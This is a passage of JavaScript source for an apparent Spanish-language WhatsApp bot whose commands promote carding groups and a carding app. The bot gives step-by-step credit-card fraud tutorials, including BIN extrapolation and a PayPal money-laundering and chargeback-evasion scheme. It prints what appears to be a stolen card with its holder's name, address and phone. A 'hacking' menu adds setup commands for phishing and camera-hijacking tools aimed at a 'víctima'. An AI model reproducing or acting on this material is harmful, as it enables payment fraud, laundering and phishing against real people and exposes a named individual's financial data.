 Ⓜ️sᴋʏᴄᴀʟʟʙᴅ ғʀᴇᴇ ᴠɪʀᴛᴜᴀʟ ɴᴜᴍʙᴇʀ: http: //www.freevirtu...r.skycallbd.com/
 Ⓜ️ᴄᴀᴘᴛᴜʀᴇ sᴍs: https://catchsms.com/
 Ⓜ️sᴍs ɢᴇᴛ: http://smsget.net
 Ⓜ️1s2ᴜ: https://1s2u.com/
 Ⓜ️ʀᴇᴄᴇɪᴠᴇ sᴍs: http://getsms.org/
 Ⓜ️ᴠʀɪᴛᴛʏ: https://virtty.com/
 Ⓜ️ᴛᴇxᴛ ᴀɴʏᴡʜᴇʀᴇ: http://www.textanywhere.net/
 Ⓜ️ʀᴇᴄᴇɪᴠᴇ sᴍs ᴏɴʟɪɴᴇ.ᴍᴇ: http://receivesmsonline.me/
 Ⓜ️ᴛᴇᴍᴘᴏʀᴀʀʏ ᴇᴍᴀɪʟs: https://www.temp-mails.com/
 Ⓜ️ᴘᴜʀᴄʜᴀsᴇ ᴠɪʀᴛᴜᴀʟ ɴᴜᴍʙᴇʀ: http://www.virtualnumberbuy.com/
 Ⓜ️ғʀᴇᴇ ʀᴇᴄᴇɪᴠᴇ sᴍs ᴏɴʟɪɴᴇ: http://freereceivesmsonline.com/
 Ⓜ️ɴᴅᴛᴀɴ sᴍs: https://sms.ndtan.net/
 Ⓜ️sᴍs ʟɪsᴛᴇɴ: https://smslisten.com/
 Ⓜ️ғʀᴇᴇ ᴠɪʀᴛᴜᴀʟ sᴍs ɴᴜᴍʙᴇʀ: https://freevirtualsmsnumber.com/
 Ⓜ️sᴍs ᴛɪʙᴏ: https://smstibo.com/
 Ⓜ️ʀᴇᴄᴇɪᴠᴇ sᴍs ɴᴜᴍʙᴇʀ: https://receivesmsnumber.com/
 Ⓜ️ғʀᴇᴇ sᴍs ᴄᴏᴅᴇ: https://freesmscode.com/
 Ⓜ️ᴏɴʟɪɴᴇ sᴍs ɴᴜᴍʙᴇʀs: https://smsnumbersonline.com/
 Ⓜ️sᴍs ʀᴇᴄᴇᴘᴛɪᴏɴ: https: //smsreceiving.com
 Ⓜ️ᴛʀᴀsʜ ᴍᴏʙɪʟᴇ https://es.mytrashmobile.com/nu`
        cnf.sendMessage(from, wiw, image, { quoted: mek, caption: sitiossms })									 
          break
          
          case 'grupobins':
	  			  case 'grupo_bins':
					case 'grupo-bins':
					case 'bineriauniversal':
					case 'bineria-universal':
					case 'bineria_universal':
							if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())  
wiw = fs.readFileSync(`./media/bineria.jpg`)
 grupobins = `◾️Bineria Universal - Grupo Oficial

◾️Contenido: Carding - Binning

◽Bins
◽Lives
◽Métodos
◽Tutoriales
◽Cosas Extras

◾️Aprenderás A Sacar Todo Tipo De Cuentas

◽Disney+
◽HboMax
◽Stars+
◽Paramount+
◽Acorntv
◽Prime Video
◽Netflix (aveces)
◽Crunchyroll
◽Funimation
◽Hulu
◽Spotify
◽Deezer
◽Napster
◽Tidal
◽Twitch
◽IpVanish
◽Duolingo Plus
◽Onlyfans
◽NordVpn
◽ExpressVpn
◽Fanatiz
◽FútboTv
◽Apple Music
◽PayPal
◽Canva
◽Hootsuite
◽Noggin

◾️Link: https://chat.whatsapp.com/DwvnxoVjSoz4246vFbZBCP

◾️Nota:

◽El Grupo Se Creo con La Intención De Compartir Conocimiento,Métodos y Bins Funcionales.

◽No Enlaces - Spam - Ventas - Presumir.

◽Contamos Con Un Bot De Autoayuda.

◽También sorteamos Números Para WhatsApp y Cuentas Premiun.

◽Porfavor Respetar Las Reglas Del Grupo y Disfrutar Tu Estadía.`
        cnf.sendMessage(from, wiw, image, { quoted: mek, caption: grupobins })									 
          break


	  			  case 'member':
				
							if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())  
wiw = fs.readFileSync(`./media/bineria.jpg`)
 member = `𝐓𝐞𝐚𝐦 𝐁𝐢𝐧𝐞𝐫𝐢𝐚 𝐔𝐧𝐢𝐯𝐞𝐫𝐬𝐚𝐥:

𝐒𝐭𝐚𝐟𝐟 𝐎𝐟𝐢𝐜𝐢𝐚𝐥 𝐃𝐞 𝐁𝐢𝐧𝐞𝐫𝐢𝐚 𝐔𝐧𝐢𝐯𝐞𝐫𝐬𝐚𝐥:

• Joseph ➜ Fundador
• Castillo ➜ Cofundador
• Duende ➜ Cofundador
• Ghost  ➜ Cofundador
• Jasiel ➜ Cofundador
• Joel ➜ Cofundador
• Ruso ➜ Cofundador
• Admiro ➜ Iptv
• Angy ➜ Ayudante
• Arturo ➜ Dx
• Antonio ➜ Ayudante
• Blankito ➜ Checker
• Edgar ➜ Ayudante
• Jose Miguel ➜ Hits
• Joshua ➜ Netfree
• Sangronith Reymundo ➜ Vip
• Suicida ➜ Cancerbero

Bot:

• JosephBot ➜ Moderador

Comunidad:

• Bineria Universal

➜ https://t.me/+I5F2JBRwE6c5M2Jh
➜ https://chat.whatsapp.com/DwvnxoVjSoz4246vFbZBCP

• Team Akatusuki

➜ https://t.me/+afrsqguJ-gI2ODMx
➜ https://chat.whatsapp.com/B8zvZmyCs2TDqYaseIlAxd

• Carding Express

➜ https://t.me/+bV90NSjUjMdiYjBh
➜ https://chat.whatsapp.com/C008DPwzgUp0eAyz4bi0AU`
        cnf.sendMessage(from, wiw, image, { quoted: mek, caption: member })									 
          break
          
          case 'apkbinero':
	  				case 'apk-binero':
					case 'apk_binero':
					case 'carding':
		 if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis()) 
wiw = fs.readFileSync(`./media/apkbinero.jpg`)
 apkbinero = `Les recomiendo esta nueva aplicación de carding completamemente gratis.

https://www.mediafire.com/file/oxlgjgmlgw2uh6c/Bineria+Universal.apk/file

Contenido 👇

Bins
Métodos
Cuentas Premiun
Cursos
Tutoriales
Generadores y mucho más`
        cnf.sendMessage(from, wiw, image, { quoted: mek, caption: apkbinero })									 
          break
          
          case 'chfree':
					case 'cursovip':
	  				case 'curso-vip':
					case 'curso_vip':
							if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())  
wiw = fs.readFileSync(`./media/bineria.jpg`)
 chfree = `⚜️🆓 CURSO VIP 🆓⚜️
 
✝️ Temario Del Curso:

📍 Crear Cuentas Premiun

📌 ${prefix}Acorntv
📌 ${prefix}Duolingo
📌 ${prefix}Hbomax
📌 ${prefix}Lumosity
📌 ${prefix}PrimeVideo
📌 ${prefix}Onlyfans

📍 Extrapolar Un Bin

📌 ${prefix}Extrapolación
📌 ${prefix}Extrapolación_HQ
📌 ${prefix}Extrapolar_Compras

📍 Checker CC

📌 ${prefix}wayfair

📍 Crear Cuentas Premiun Sin Bin

📌 ${prefix}CactusVPN
📌 ${prefix}Tidal
📌 ${prefix}Pornhub
📌 ${prefix}Avira

📍 Bonus

📌 ${prefix}Introducción_bins
📌 ${prefix}Introducción_carding
📌 ${prefix}Paypal
📌 ${prefix}Compras
📌 ${prefix}cc 「 Live or Dead 」
📌 ${prefix}Carding

↪️ Soporte y Ayuda ↩️

https://chat.whatsapp.com/DwvnxoVjSoz4246vFbZBCP`
        cnf.sendMessage(from, wiw, image, { quoted: mek, caption: chfree })									 
          break
          // Final Menu Carding - Bins
        

// Curso Vip-Free

  case 'acorntv':
					case 'acorn_tv':
	  				case 'acorn-tv':
							if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
  wiw = fs.readFileSync(`./chfree/acorntv/acorntv.mp4`)
acorntv = `[✅] TUTORIAL ACORNTV

[🛐] APORTADOR: JOSEPH

[🛃] MÁS CONTENIDO AQUÍ 👇

[🔗] https://t.me/BineriaUniversal`					
cnf.sendMessage(from, wiw, video, { quoted: mek, caption: acorntv })									 
        break
        
         case 'hbomax':
							if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
  wiw = fs.readFileSync(`./chfree/hbomax/hbomax.mp4`)
hbomax = `[✅] TUTORIAL HBOMAX

[🛐] APORTADOR: JOEL

[🛃] MÁS CONTENIDO AQUÍ 👇

[🔗] https://t.me/BineriaUniversal`					
cnf.sendMessage(from, wiw, video, { quoted: mek, caption: hbomax })									 
        break

			
					case 'duolingo':
					if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
wiw = fs.readFileSync(`./chfree/duolingo/duolingo.mp4`)
duolingo = `[✅] TUTORIAL DUOLINGO

[🛐] APORTADOR: CANIBALDOC

[🛃] MÁS CONTENIDO AQUÍ 👇

[🔗] https://t.me/BineriaUniversal`					
cnf.sendMessage(from, wiw, video, { quoted: mek, caption: duolingo })									 
        break
			
			case 'primevideo':
			if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
wiw = fs.readFileSync(`./chfree/primevideo/primevideo.mp4`)
primevideo = `[✅] TUTORIAL PRIME VIDEO

[🛐] APORTADOR: CANIBALDOC

[🛃] MÁS CONTENIDO AQUÍ 👇

[🔗] https://t.me/BineriaUniversal`					
cnf.sendMessage(from, wiw, video, { quoted: mek, caption: primevideo })									 
        break
			
			case 'lumosity':
			if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
wiw = fs.readFileSync(`./chfree/lumosity/lumosity.jpeg`)
 lumosity = `🟧 Lumosity Método

📌 No es necesario usar vpn

🔘 Ingresa al siguiente enlace: https://www.lumosity.com/sign_up

🔘 Registrar y crear su cuenta

🔘 Rellenar con datos inventados.

🔘 Ya con la cuenta creada ir a "Obtener acceso Ilimitado"

🔘 Escoger cualquier plan

🔘 En la página de pago colocar:

💳 Tarjeta: 4242424242424242
📆 Fecha: Generado
🔑 Cvv: Generado

📌 Pais: Estados Unidos
📌 City: New York 
📌 State : New York
📌 Zip Code: 10080 

✅ Felicidades, ya tienes Lumosity Premiun

🔱 Cortesía De: Bineria Universal`
        cnf.sendMessage(from, wiw, image, { quoted: mek, caption: lumosity })									 
          break
			
			case 'onlyfans':
			if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
wiw = fs.readFileSync(`./chfree/sinbin/pornhub.jpeg`)
onlyfans = ``
cnf.sendMessage(from, wiw, image, { quoted: mek, caption: onlyfans })	
break
          
			// EXTRAPOLAR - EXPLICACIÓN
case 'extrapolar_compras':
case 'Extrapolar-Compras':
case 'ExtrapolarCompras':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
cnf.sendMessage(from,`⚡*EXTRAPOLAR CC PARA UN BIN DE COMPRAS FÍSICAS*⚡

*INICIAMOS DE UN PUNTO BASE (UNA CC REAL)*

*EJEMPLO:*
4213-1660-3321-0102
12/23 189

*COMO SE EXTRAPOLA LA EXTRAPOLACION BÁSICA Y LA DE 5 X*

4213-1660-3321-XXXX
USAMOS FECHAS DE LA CC
12/23
EL CVV PUEDE SER RAMDON O EL DE LA CC


*ESAS EXTRAPOLACIONES SON LAS COMUNES PARA BINS DE COMPRAS FISICAS*

*SI SE ENCUENTRA UN BIN ASI:*

*EJEMPLO:*
421316XXXXXXXXX
GEN:
GEN:

 *ESE BIN ES SOLO DE CUENTAS PREMIUM SABEMOS QUE NO SIRVE PARA COMPRAS FISICAS*`, MessageType.text, {quoted: mek})			
		break
		
		case 'cactusvpn':
		if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
wiw = fs.readFileSync(`./chfree/sinbin/cactusvpn.jpeg`)
 cactusvpn = `📩🔰 CAPTUS VPN SIN BIN   🔰📩

⚜ IP: Con La Tuya

1️⃣ Ir al siguiente link:

https://www.cactusvpn.com/es/prueba-de-vpn-gratis/

2️⃣ Llenar los datos con correo invetado

3️⃣ Confirmar la cuenta y crear su contraseña y listo

ℹ Recuerda Usar Firefox Focus

🔱 Cortesia De: @BineriaUniversal`
        cnf.sendMessage(from, wiw, image, { quoted: mek, caption: cactusvpn })									 
          break
          
			case 'f-security':
			if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
wiw = fs.readFileSync(`./chfree/sinbin/F-Security.jpeg`)
 FSecurity = `🔰📩 F-Secure SAFE: 6 MESES de LICENCIA Gratuita 📩🔰

ℹ F-Secure SAFE es una solución antivirus que proporciona seguridad informática integral en la red global, protege contra virus, troyanos y ransomware.

⬜ Para obtener una licencia, primero debes conectarte a Alemania por medio de vpn, y registrarse mediante el link a continuación, y listo!...

🔗 LINK:
https://campaigns.f-secure.com/safe/heise/de/

🔱 Cortesia De: @BineriaUniversal`
        cnf.sendMessage(from, wiw, image, { quoted: mek, caption: FSecurity })									 
          break
          
			case 'tidal':
			if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
wiw = fs.readFileSync(`./chfree/tidal/tidal.mp4`)
 tidal = `📩🔰 MÉTODO TIDAL 🔰📩

📍 PASOS:

⚜ PRIMER PASO: ENCENDER VPN EN BULGARIA EN CASO NO TENGAS DE UN VPN DE PAGA RECOMIENDO HOLAVPN MOOD

⚜ SEGUNDO PASO: DIRIGIRSE A LA PÁGINA DE TIDAL. RECUERDEN USAR NAVEGADOR PRIVADO
Duckduckgo Via FirefoxFocus Brave Browser Etc

⚜ TERCER PASO: REGISTRATE CON UN CORREO Y UNA CONTRASEÑA 

⚜ CUARTO PASO: TE DIRIGIRA A ESCOJER UN PLAN ESCOJES EL QUE TE SALE

⚜ QUINTO PASO: LISTO AHORA TIENES TIDAL PREMIUM SIN NECESIDAD DE BIN

🔱 Cortesia De: https://t.me/BineriaUniversal`
        cnf.sendMessage(from, wiw, video, { quoted: mek, caption: tidal })									 
        break
          
          case 'pornhub':
          if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
wiw = fs.readFileSync(`./chfree/sinbin/pornhub.jpeg`)
pornhub = ``
cnf.sendMessage(from, wiw, image, { quoted: mek, caption: pornhub })		
// cnf.sendMessage(from, creditos, text, { quoted: mek})
break
         
			case 'avira':
					if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
wiw = fs.readFileSync(`./chfree/sinbin/avira.jpeg`)
 avira = `📩🔰 MÉTODO AVIRA (ANTIVIRUS & VPN) SIN BIN 🔰📩

🌐 VPN: No es necesario

1️⃣ Ingresa al siguiente enlace: https://www.avira.com/it/freesecurity-lp?x-c-channel=partnerize

2️⃣ Se registran con correo temporal.

3️⃣ Luego en tu bandeja de entrada, te llegara un mensaje de confirmación, lo abres y creas una contraseña

4️⃣ Les pedira su nombre y pais. Lo colocan y le dan en continuar 

5️⃣ Felicidades, ya tienes Avira Antivirus & VPN en su versión Premiun.

↪️ Cortesía De: Bineria Universal`
        cnf.sendMessage(from, wiw, image, { quoted: mek, caption: avira })									 
          break
          
          case 'paypal':
          if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
cnf.sendMessage(from,`Método de los 3 Paypal.

Es bastante sencillo de usar.

Cómo sabrás Paypal ya empezó a meter chargeback a las cuentas. Cosa que es algo jodido. 

Para ello vamos a lavar el dinero de cierta forma.

Necesitaremos 3 cuentas.

1- La que envía, está será la que haremos el pago.

2- La que recibe y vuelve a enviar, Está será la que en caso metan chargeback reciba los reportes y no perdamos el dinero, está tiene que ser LATINA de preferencia y tener algo de historial. En caso quieras hacerlo con cuenta nueva es bastante probable te la limiten si en el primer mes envías más de 30$.

3- La cuenta que recibe final, sin cargos y dinero limpio. (95% de dinero limpio ya que hay una baja probabilidad Paypal analize las transacciones)

Método:

1- Prendemos el VPN IPVANISH y colocamos cualquier zona de usa no tan conocida. Aunque puedes colocar la misma IP de la cc. 

2- Creamos la cuenta colocando todos los datos posibles, y a la hora de colocar la cc omitimos.

3- Vamos a cuentas bancarias y tarjetas y añadimos la cc. Ojo la cc no se añadirá si los datos no concuerdan o si tienes ban en Paypal. Y siempre usar Datos ya que con wifi jode algo. Versión de Paypal 7.18

4- Una vez tengamos añadida la cc mandaremos a la cuenta que recibe y manda y añadiremos este mensaje.

"Estoy satisfecho con los servicios brindados y estaré de acuerdo en cualquier cargo con el vendedor"

Obviamente debes colocarlo en el idioma de el dueño de la CC. No mames un estadounidense mandando en español jaja (Es broma).

5- Recibiremos el dinero en la cuenta 2 la cual puede lo retengan 24-48h. Si ves que las retenciones ya son muy repetitivas para. Y deja de enviar a esa cuenta. Puede te baneen o limiten. 

6- Después de las 24h debemos tener cada correo de Paypal y password que usamos con propósitos de confirmar los pagos. Así no tener problemas tan pesados ante un chargeback. 

Chargeback = Reembolso. 

7- Cabe añadir que antes de esos días pudiste añadir información de Tracking cosa que beneficia a Paypal. Espero lo hayas hecho antes de confirmar los pagos desde cada cuenta, una vez los confirmes, lo que harás es quitar la dirección y la cc de las cuenta 1 para así evitar los dueños nos jodan muy fácilmente.

8- Luego de eso esperaremos el menor tiempo posible y mandaremos de nuestro Paypal 2 a la cuenta final. Y listo.

Paralelal is also used.

Usa estancias, y verificar el correo, número telefónico sirve bastante, existen muchas apps gratuitas en play store que llega el sms.`, MessageType.text, {quoted: mek})


case 'paypal':
	if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis()) 
cnf.sendMessage(from,`Bueno ahora sigamos.

Paypal a empezado a actualizar algo el código, así que cualquier versión de Paypal puede te llegue a saltar la verificación de número a la hora de pagar o crear la cuenta de forma obligada. Así que para ello vamos a necesitar el uso de socks.

Los socks los pueden sacar usando GatherChecker. Y usando GatherProxy pueden colocarselo. Si usan VPN les recomiendo denotar usando Whoer.net
Dónde debe decir Proxy : No, Anonimizador No, Blacklist No.

Tanto en su IP y VPN. Así se aseguran que no estén Ban. En el caso de MAC esto se llega a notar si es que no les ha jalado más de 50 ccs en Paypal.

Porque digo cantidad grande. Sacarle a Paypal consiste en persistencia. No necesariamente porque te fue mal con 30 significa no jale. Puede que con 1 recuperes todo, si no entiendes ese concepto no sé que haces en este grupo. 

Okey una vez verificamos ambas cosas, nos daremos cuenta que aún así existe la probabilidad Paypal nos pida número, para ello usaremos aplicaciones que lleguen el código o simplemente 5sim.net para verificar. (Esto es un consejo).

Luego hacemos esto, sabremos que tenemos la cuenta lista, a la hora de tratar asociar la CC, esperaremos 1 min y NO copies la CC. 

No hagas copia y pega, no lo recomiendo, trata de demorarte el tiempo que cualquier persona normal trata de asociar su tarjeta, como si fueras un usuario normal (Antes de hacer esto debiste verificar número aunque no es un dato indispensable).

Luego hayas asociado, esperarás un promedio de 20 minutos exacto para ejecutar el primer pago, y asi sucesivamente en intervalos de 20-25 minutos para ejecutar más y más pagos. Cabe añadir que solo hay un máximo de 2 pagos fallidos de ahí la cuenta no jalara más. Por ello recomiendo leas las partes de dudas.

Ahora hay un problema, últimamente los chargeback nos están jodiendo un poco, bueno para ello existe la forma clásica de ejecutar método de varios Paypal para evitar el chargeback. 

Bueno ahora también existe la probabilidad de usar la misma forma pero usando 4 cuentas.

Un Paypal de China recién creado que le podemos usar de receptor e ir generando historial en el, recomiendo mantener el dinero un máximo de 1d. No lo dejes mucho tiempo ahí de ahí moverlo a un Paypal donde vayas a retirar directamente o vayas a recoger y reenviar.

Esto es porque china permite un mayor número de transacciones en Paypal, aunque esto como mencioné no es un requisito aunque si es bueno aplicarlo. 

Ahora cabe añadir que los chargeback están llegando en un promedio de 7h mínimo si eres salado, a máximo de 3d.

Si después de 3d no llegó nada es posible que no haya chargeback de esos pagos. 

Ahora añado que pueden guardar las cuentas de Paypal, las cuales les van a servir para volver a enviar dinero, si no quiten la cc nunca. Esa cuenta de Paypal guarden el correo-password y esperen 3dias y vuelvan a intentar enviar.`, MessageType.text, {quoted: mek})
  	break		
			
			
			
	case 'compras':
	if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
cnf.sendMessage(from,`🏦 COMPRAS CON BIN #1 🏦

Necesitas una tarjeta de crédito u débito real de preferencia una que sea solo de tu propiedad alguna tarjeta que compraste y Haun no expire será más que suficiente haunque una cc que no está tan sobrexplotada de la serie correcta funcionara. 

Usaremos está forma [en lo personal siempre funciona] 

🎃 El bin debe tener 11 o 14 dijitos y solo 4 o 3 "x" además extrapolaciones al modo "Sofía" no suelen funcionar pero probar no esta de mas

🎃 De preferencia saber si en la página que deseas calar pasan las débito o crédito de esta manera podrás ir directamente a él tipo de CC que necesitas para la compra

🎃 Tener a la mano una buena vpn recomiendo Hma Vpn y Express VPN - Obten el apk premium con la note #express*-vpn-apk

🎃 Algunas VPN son para algunas shops en específico por ejemplo TunnelBear no te da ban en Etsy puedes usar eso para tus ships

🎃 Puedes intentar comprar ccs o usar ccs con series bugs ejemplo: 4444xx 5555xx 3777xx - etc*`, MessageType.text, {quoted: mek})	

		
		case 'compras':
		if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
cnf.sendMessage(from,`🏦 COMPRAS CON BIN #2 🏦

Convertirás una cc real en un bin para compras en páginas shopay

- Esto puede ser algo tonto pero algunas personas extrapolan mal la CC 

CCnum:: 4037660038471116
Cvv: 788
Expm: 12
Expy: 21
Fname: Brandon
Lname: Lane
Address: 1945 Pleasantview Dr
City: MARION
State: IA
Zip: 52302
Country: USA
Phone: 5635801794

- CC QUEMADA -

Entonces 🏦

BIN: 403766003847xxxx
FECHA: 12/21
CVV: GENERADO

En la página shop pay usaras los datos de la CC real no hay problema haunque recomiendo cambiar el número de teléfono y los nombres.

Ahora cuando tengas el bin 🌱

En algunos casos vas a necesitar Lives charged más que lives CCN si no saves la diferencia en sencillo

⚠️ LIVE CCN = la tarjeta es correcta pero el cvv es incorrecto
⚠️ LIVE CVV = código de seguridad y número correcto - puede que no funcionen depende de la seguridad 
⚠️ CCN CHARGED = Tarjeta que ya pasó la autorización de cargo y jalara al 100% amenos que la serie no sea buena o no sea shoppay
⚠️ CVV CHARGED = todo correcto se realizó un cargo por un valor que varía`, MessageType.text, {quoted: mek})					
			break
			
			// Menu Hacking
			case 'routersploit':
			if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
cnf.sendMessage(from,`📱¿Que es RouterSploit?📱

RouterSploit, es un framework de seguridad open source muy similar al conocido Metasploit con el cual podremos auditar nuestros dispositivos (routers, webcam, NAS, etc) para comprobar si tienen vulnerabilidades conocidas.

📱 El framework, cuenta con los siguientes 5 módulos:📱

🌎 Exploits: módulos que aprovechan las vulnerabilidades identificadas. 🌎

🌐 Creds: módulos para probar credenciales en los servicios de red. 🌐

🔒 Scanners: módulos que verifican si un objetivo es vulnerable a cualquier exploit. 🔒

💉 Payloads: módulos para generar cargas útiles en diversas arquitecturas. 💉

👾 Generic: módulos que realizan ataques genéricos. 👾

📱Instalación:📱

$ apt update && apt upgrade -y
$ termux-setup-storage
$ pkg install python git clang -y
$ pkg install -y make
$ git clone https://github.com/threat9/routersploit
$ cd routersploit
$ python3 -m pip install -r requirements.txt
$ python3 -m pip install -r requirements-dev.txt
$ chmod +x *setup.py
$ python3 setup.py install
$ python3 rsf.py

Uso:

show all

use scanners/autopwn

show options

set target 192.168.1.1`, MessageType.text, {quoted: mek})
  break					
  
					case 'infoga':
					if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
cnf.sendMessage(from,`📱 InfoGa es una herramienta que recopila información de cuentas de correo electrónico (ip, nombre de host, país, ...) de diferentes fuentes públicas (motores de búsqueda, servidores clave pgp y shodan) y verifica si los correos electrónicos se filtraron utilizando la API haveibeenpwned.com. Es una herramienta realmente sencilla, pero muy eficaz para las primeras etapas de una prueba de penetración o simplemente para conocer la visibilidad de tu empresa en Internet.📱

📱Installation :📱

$ apt update && apt upgrade
$ apt install git 
$ apt install python2
$ git clone https://github.com/m4ll0k/Infoga
$ cd Infoga
$ chmod +x *
$ pip2 install requests

📱usage:📱

$ python2 infoga.py

Now it shows all options to use this tool

$ python2 infoga.py -t gmail.com -s all

Now its started collecting emails and e-mails information

[hostname, city, organization, longitude and latitude ports..]`, MessageType.text, {quoted: mek})
  break
					
					case 'beef':
					if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
cnf.sendMessage(from,`💻INSTALACIÓN DE BeEF EN TERMUX (ANDROID)💻

$ apt update && apt upgrade -y
$ termux-setup-storage
$ pkg install -y git
$ pkg install -y ruby
$ pkg install -y vim
$ pkg install -y nodejs
$ pkg install -y unstable-repo
$ pkg install -y metasploit
$ git clone https://github.com/beefproject/beef
$ cd beef
$ ./update-beef
$ vim config.yaml

Editar user y pass y salir guardando cambios.

$ ./beef -x`, MessageType.text, {quoted: mek})
  break
					
  case 'ngrok':
  if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
cnf.sendMessage(from,`📱¿Qué es Ngrok?📱

Ngrok es una herramienta que permite acceder nuestro servidor local a cualquier persona en internet con la que compartamos una url generada dinamicamente.

📱INSTALACIÓN DE Ngrok EN TERMUX (ANDROID)📱

$ apt update && apt upgrade -y
$ termux-setup-storage
$ pkg install -y git
$ git clone https://github.com/TermuxHacking000/NgrokTH
$ ls
$ cd NgrokTH
$ ls
$ chmod +x *
$ ls
$ ./ngrok.sh

Aqui debemos ponemos 1 para instalar ngrok en termux.

Aqui deveremos ir a la pagina de Ngrok registrarnos o inciar seccion en Ngrok y copiar nuestro authtoken de nuestra cuenta aqui les dejo la pagina de Ngrok para que vallan.

Sitio https://ngrok.com/

Una vez aigan copiado su authtoken lo pegan en termux y le pulsan a enter.

Despues de eso nos dira para elegir entre
-ngrok http 4444
-ngrok tcp 4444

Pero yo en este caso pongo 
ngrok http 8080
Le damos a enter y ya de aver echo todo eso ya tenes el Ngrok`, MessageType.text, {quoted: mek})
  break
  
  
  case 'phoneinfoga':
  if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
cnf.sendMessage(from,`📲PhoneInfoga📲

🌎 PhoneInfoga es una de las herramientas más avanzadas para escanear números de teléfono internacionales utilizando solo recursos gratuitos. Le permite recopilar primero información estándar como país, área, operador y tipo de línea en cualquier número de teléfono internacional. Luego, busque huellas en los motores de búsqueda para tratar de encontrar el proveedor de VoIP o identificar al propietario. 🌎

📲Instalación:📲

$ pkg upgrede -y && pkg update -y
$ pkg install -y python git
$ git clone https://github.com/sundowndev/PhoneInfoga
$ ls
$ cd PhoneInfoga
$ mv config.example.py config.py
$ ls
$ chmod 777 config.py config.py
$ python3 -m pip install -r requirements.txt
$ python3 phoneinfoga.py -v
$ python3 phoneinfoga.py -n
$ cp -rf ../usr/bin/ngrok $HOME/PhoneInfoga`, MessageType.text, {quoted: mek})
  break
	
			case 'fotosploit':
			if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
cnf.sendMessage(from,`📲¿Qué es FotoSploit?📲

🌐 FotoSploit es una herramienta que se especializa en la ingenieria social, Esta herramienta permite al usuario que la utilice, subir una imágen a un enlace phishing, por lo tanto, será mas probable que la víctima acceda al enlace si ve una imágen que le llame la atención. 🌐

📲INSTALACIÓN DE FotoSploit EN TERMUX (ANDROID)📲

$ apt update && apt upgrade -y
$ termux-setup-storage
$ pkg install -y git
$ git clone https://github.com/Cesar-Hack-Gray/FotoSploit
$ cd FotoSploit
$ bash install.sh
$ ./FotoSploit

Show options

set foto /sdcard/foto.jpg
[RUTA DE TÚ FOTO]

set title url 
[TÍTULO DEL VIDEO]

set mini title 
[DESCRIPCIÓN DEL VIDEO]

set view 
[VISTA DE LA FOTO]

set red social 
[RED SOCIAL PHISHING]

run
[COMIENZA A GENERAR EL ENLACE]

Envía el enlace a tú víctima.`, MessageType.text, {quoted: mek})
  break
					
					case 'sqlmap':
					if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
cnf.sendMessage(from,`💉Sqlmap es una herramienta de prueba de penetración de código abierto que automatiza el proceso de detección y explotación Defectos de inyección SQL y apoderamiento de servidores de bases de datos. Viene con un potente motor de detección, muchas funciones de nicho. para el mejor probador de penetración y una amplia gama de cambios que duran desde la toma de huellas digitales de la base de datos, hasta la obtención de datos de la base de datos, para acceder al sistema de archivos subyacente y ejecutar comandos en el sistema operativo a través de conexiones fuera de banda..💉

🔒Installation:📲

$ apt update && apt upgrade
$ apt install git 
$ apt install python2
$ apt install python
$ git clone https://github.com/sqlmapproject/sqlmap
$ cd sqlmap
$ chmod +x *

📲Run:📲

$ python2 sqlmap.py -h

It shows all options to use this tool sqlmap

$ python2 sqlmap.py`, MessageType.text, {quoted: mek})
  break
			
					
					case 'socialsploit':
cnf.sendMessage(from,`📱SocialSploit es un framework de phishing que nos ayuda a hackear con ngrok y serveo📱

📱Installation:📱

$ pkg install -y git 
$ git clone https://github.com/Cesar-Hack-Gray/SocialSploit
$  cd SocialSploit 
$  ls
$ bash install.sh
$ ./Sploit`, MessageType.text, {quoted: mek})
  break
					
					case 'grabscam':
					if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
cnf.sendMessage(from,`📲GrabCam📲

🔒 Piratería de cámaras por herramienta de enlace. Es un script basado en bash que está hecho oficialmente para termux a partir de esta herramienta que puede hackear la cámara de tu víctima con una simple página de oferta. Esta herramienta funciona tanto en dispositivos Android rooteados como en dispositivos Android no rooteados. 🔒

📲Instalación📲

$ apt-get update
$ apt-get upgrade
$ pkg install python 
$ pkg install python2
$ pkg install git
$ pip install lolcat
$ git clone https://github.com/noob-hackers/grabcam
$ ls
$ cd grabcam
$ ls
$ bash grabcam.sh
Hackear micrófono android,ios ,pc.`, MessageType.text, {quoted: mek})
  break
					
					case 'hammer':
					if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
cnf.sendMessage(from,`📱¿Que es Hammer?📱

💉Que es DDoS y Como funciona¿?💉

